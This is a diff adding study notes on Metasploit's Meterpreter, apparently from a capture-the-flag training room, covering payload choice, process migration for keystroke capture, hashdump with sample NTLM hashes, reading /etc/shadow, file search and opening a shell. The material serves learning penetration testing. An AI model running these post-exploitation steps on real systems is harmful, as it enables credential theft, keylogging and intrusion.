@@ -24,3 +24,65 @@ NOTE: file can be placedin cd /tmp
 8. Execute the payload ./payload_file
 9. In tab2, meterpreter will be opened, depends on OS, use either hashdump or cat /etc/shadow
  For linux, put the session to background, switch to /post/linux/gather/hashdump with setting the session as mandatory argument
+
+
+Meterpreter flavours
+msfvenom --list payloads | grep meterpreter
+Your decision on which version of Meterpreter to use will be mostly based on three factors;
+The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
+Components available on the target system (Is Python installed? Is this a PHP website? etc.)
+Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.) 
+To show payloads per module -> use module -> show payloads
+If you run the help command, you will see Meterpreter commands are listed under different categories.
+Core commands
+File system commands
+Networking commands
+System commands
+User interface commands
+Webcam commands
+Audio output commands
+Elevate commands
+Password database commands
+Timestomp commands
+
+getuid -> show under what user meterterprener is running and idea of possible priviligle level
+ps to list all processes
+Migrate
+Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the keyscan_start, keyscan_stop, and keyscan_dump command options to make Meterpreter act like a keylogger.
+Migrating to another process may also help you to have a more stable Meterpreter session.
+To migrate to any process, you need to type the migrate command followed by the PID of the desired target process. The example below shows Meterpreter migrating to process ID 716. 
+meterpreter > migrate 716 
+NOTE: migration to the process with lower level access, might make impossible to gain the previous more previliged one
+Hashdump
+
+The hashdump command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.
+
+The hashdump command
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter >
+While it is not mathematically possible to "crack" these hashes, you may still discover the cleartext password using online NTLM databases or a rainbow table attack. These hashes can also be used in Pass-the-Hash attacks to authenticate to other systems that these users can access the same network.
+
+Search
+
+The search command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.
+
+The search command
+meterpreter > search -f flag2.txt
+Found 1 result...
+    c:\Windows\System32\config\flag2.txt (34 bytes)
+meterpreter >
+Shell
+
+The shell command will launch a regular command-line shell on the target system. Pressing CTRL+Z will help you go back to the Meterpreter shell.
+
+The shell command
+meterpreter > shell
+Process 2124 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
